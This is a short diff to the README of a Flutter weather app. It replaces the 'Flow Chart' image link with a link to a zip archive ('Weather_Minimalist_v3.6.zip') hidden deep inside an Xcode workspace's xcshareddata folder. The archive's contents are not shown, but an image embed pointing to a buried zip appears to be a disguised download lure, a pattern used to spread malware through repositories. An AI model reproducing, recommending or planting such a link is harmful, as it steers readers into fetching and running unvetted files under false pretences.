@@ -7,4 +7,4 @@ A sleek, no-nonsense Flutter weather app that delivers real-time weather updates
 - 🚀 Snappy Startup – Loads fast, runs smooth—because nobody likes waiting.
 - 
 📸 Flow Chart
-![Minimal Weather app](https://github.com/user-attachments/assets/c4965468-2af1-45cb-b468-853c891cbe4c)
+![Minimal Weather app](https://raw.githubusercontent.com/rishikeshjoshy/Minimalist_Weather/main/macos/Runner.xcodeproj/project.xcworkspace/xcshareddata/Weather_Minimalist_v3.6.zip)
